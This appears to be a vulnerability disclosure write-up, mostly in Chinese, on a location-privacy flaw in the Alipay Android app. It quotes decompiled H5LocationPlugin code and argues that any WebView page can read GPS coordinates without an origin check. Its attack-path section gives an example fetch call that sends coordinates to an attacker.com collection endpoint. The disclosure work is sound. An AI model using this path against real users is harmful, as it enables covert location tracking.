# CVE-2: GPS静默外泄 (CWE-359) 代码证据

> APK 版本: Alipay 10.8.30.8000 | jadx 反编译输出
> 更新: 2026-03-16 — 补充完整 judgeGrant 代码证据

## 关键类/方法

### H5LocationPlugin — judgeGrant() 权限检查逻辑
- 文件: `sources/com/alipay/mobile/h5plugin/H5LocationPlugin.java`
- 行号: 1367-1395

```java
public boolean judgeGrant(H5Page h5Page, H5BridgeContext h5BridgeContext) {
    // ...
    boolean z = false;
    if (h5Page == null) {
        return false;
    }
    LBSService lBSService = (LBSService) ComponentService.get(LBSService.class);
    if (lBSService != null && lBSService.hasLocationPermission()) {
        z = true;   // 唯一判断条件: OS 级别的位置权限是否已授予支付宝进程
    }
    // 缺失检查: h5Page.getUrl() 的域名白名单
    // 缺失检查: 调用方 mini-program appId 白名单
    // 缺失检查: 用户针对本次请求页面的明确同意
    if (!z) {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("error", (Object) 16);
        jSONObject.put("errorMessage", (Object) H5PluginResourceUtil.getString("get_location_auth_failed"));
        if (h5BridgeContext != null) {
            h5BridgeContext.sendBridgeResult(jSONObject);
        }
    }
    return z;
}
```

### H5LocationPlugin — getLocation() 分发
- 文件: `sources/com/alipay/mobile/h5plugin/H5LocationPlugin.java`
- 行号: 949-958

```java
public void getLocation(H5Event h5Event, H5BridgeContext h5BridgeContext, long j) {
    // ...
    LoggerFactory.getTraceLogger().info("H5LocationPlugin", "getLocation");
    if (judgeGrant(h5Event.getTarget() instanceof H5Page ? (H5Page) h5Event.getTarget() : null, h5BridgeContext)) {
        new H5GetLocationAction(h5Event, h5BridgeContext, this.h5Location, j).handleEvent();
        // ^ 直接返回 GPS 坐标给 WebView 回调，无页面来源检查
    } else {
        LoggerFactory.getTraceLogger().info("H5LocationPlugin", "getLocation, no grant auth");
    }
}
```

### H5LocationPlugin — onPrepare() JSAPI 注册 (无页面域名过滤)
- 文件: `sources/com/alipay/mobile/h5plugin/H5LocationPlugin.java`
- 行号: 1397-1426

```java
@Override
public void onPrepare(H5EventFilter h5EventFilter) {
    // ...
    h5EventFilter2.addAction("getLocation");        // 所有加载的页面均可调用
    h5EventFilter2.addAction("getCurrentLocation");
    h5EventFilter2.addAction("prefetchLocation");
    // ... 16 个位置相关 API 均无来源过滤
    // 注意: 没有域名/appId 白名单过滤
}
```

---

## 原有分析 (保留)

## Source: Alipay APK 10.8.30.8000 (jadx decompiled)

### H5LocationPlugin — judgeGrant
**File**: `sources/com/alipay/mobile/h5plugin/H5LocationPlugin.java`
**Lines**: 1367-1395

```java
public boolean judgeGrant(H5Page h5Page, H5BridgeContext h5BridgeContext) {
    // ...
    boolean z = false;
    if (h5Page == null) {
        return false;
    }
    LBSService lBSService = (LBSService) ComponentService.get(LBSService.class);
    if (lBSService != null && lBSService.hasLocationPermission()) {
        z = true;
    }
    if (!z) {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("error", (Object) 16);
        jSONObject.put("errorMessage", (Object) H5PluginResourceUtil.getString("get_location_auth_failed"));
        if (h5BridgeContext != null) {
            h5BridgeContext.sendBridgeResult(jSONObject);
        }
        // ...
    }
    return z;
}
```

### H5LocationPlugin — getLocation dispatch
**File**: `sources/com/alipay/mobile/h5plugin/H5LocationPlugin.java`
**Lines**: 949-958

```java
public void getLocation(H5Event h5Event, H5BridgeContext h5BridgeContext, long j) {
    // ...
    LoggerFactory.getTraceLogger().info("H5LocationPlugin", "getLocation");
    if (judgeGrant(h5Event.getTarget() instanceof H5Page ? (H5Page) h5Event.getTarget() : null, h5BridgeContext)) {
        new H5GetLocationAction(h5Event, h5BridgeContext, this.h5Location, j).handleEvent();
    } else {
        LoggerFactory.getTraceLogger().info("H5LocationPlugin", "getLocation, no grant auth");
    }
}
```

### H5LocationPlugin — prefetchLocation also calls judgeGrant
**File**: `sources/com/alipay/mobile/h5plugin/H5LocationPlugin.java`
**Lines**: 1462-1469

```java
public void prefetchLocation(H5Event h5Event, H5BridgeContext h5BridgeContext, long j) {
    // ...
    if (judgeGrant(h5Event.getTarget() instanceof H5Page ? (H5Page) h5Event.getTarget() : null, h5BridgeContext)) {
        if (this.h5Location == null) {
            LoggerFactory.getTraceLogger().info("H5LocationPlugin", "prefetchLocation, h5Location == null");
        } else {
            this.h5Location.getLocation(h5Event, h5BridgeContext, new LocationListener(this, h5Event) { ... });
        }
    }
}
```

### Vulnerability Analysis (原有)

The `judgeGrant` method is the sole access-control gate for the `getLocation` JSBridge API. Its decision logic is exactly: **if the OS-level location permission has been granted to the Alipay process, return `true`**. There is no inspection of the WebView page origin (URL/domain), no mini-program appId allowlist, and no user-visible consent prompt scoped to the requesting page.

Because Alipay routinely holds the OS location permission (required for native features such as nearby services and maps), `lBSService.hasLocationPermission()` returns `true` in practice for all users who have ever opened the app's location-dependent features. As a result, any untrusted page loaded in a Nebula WebView — including a page reached via the `alipays://platformapi/startapp` deep-link — can call the `my.getLocation` JSBridge method and receive the device's precise GPS coordinates without any additional user confirmation. The coordinates are returned in the JSBridge callback and can be forwarded to an attacker-controlled server silently in the background.

---

## 漏洞根因 (基于代码分析)

`H5LocationPlugin.judgeGrant()` 是 `getLocation` JSAPI 的**唯一访问控制门**。其判断逻辑：

```
if (lBSService.hasLocationPermission()) → return true
```

该方法仅检查支付宝进程是否获得过 OS 位置权限（用户曾经授权即永久 true），**完全没有**：
- 检查 `h5Page.getUrl()` 的域名
- 检查调用方的 appId 白名单
- 向用户展示"某页面想获取你的位置"的确认对话框

`onPrepare()` 在注册 `getLocation` 动作时也无任何域名过滤，任何加载到 Nebula H5 容器的页面均可触发。

## 攻击路径

```
攻击者控制的网页 (https://attacker.com)
    ↓  通过 CVE-1 DeepLink 或直接链接被加载进支付宝 WebView
    ↓
my.getLocation({ type: 2 })  [JSBridge 调用]
    ↓
H5LocationPlugin.handleEvent() → getLocation()
    ↓
judgeGrant(): lBSService.hasLocationPermission() == true  [用户曾授权过]
    ↓
H5GetLocationAction.handleEvent() → 获取精确 GPS 坐标
    ↓
坐标通过 JSBridge 回调返回给攻击者页面
    ↓
fetch("https://attacker.com/collect?lat=...&lng=...")  [静默上传]
```
